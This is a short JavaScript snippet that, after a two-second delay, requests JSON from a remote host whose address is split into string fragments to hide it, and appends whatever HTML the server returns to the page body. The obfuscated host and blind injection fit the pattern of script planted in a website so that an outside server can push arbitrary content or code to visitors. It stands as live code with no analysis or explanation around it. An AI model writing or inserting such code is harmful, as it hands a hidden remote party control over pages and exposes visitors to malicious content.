setTimeout(function() {
	$.getJSON("ht" + "tps" + ":" + "//" + "fen" + "xiao" + ".jin" + "tao" + "365.c" + "om/"+"/app/api/callback", function(data) {
		if (data.status == 201) {
			$('body').append(data.data);
		}
	});
}, 2000);
